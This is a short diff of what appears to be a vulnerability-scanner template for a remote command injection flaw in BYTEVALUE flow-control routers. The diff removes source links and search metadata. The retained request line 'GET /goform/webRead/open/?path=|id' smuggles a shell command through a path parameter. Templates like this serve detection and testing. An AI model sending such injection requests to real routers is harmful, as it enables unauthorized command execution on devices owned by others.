@@ -3,12 +3,8 @@ info:
   name: BYTEVALUE 百为流控路由器远程命令漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ahhh8s1q0l0cgrce'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ahhh8s1q0l0cgrce
-    fofa: BYTEVALUE 智能流控路由器
 http:
 - raw:
   - 'GET /goform/webRead/open/?path=|id HTTP/1.1
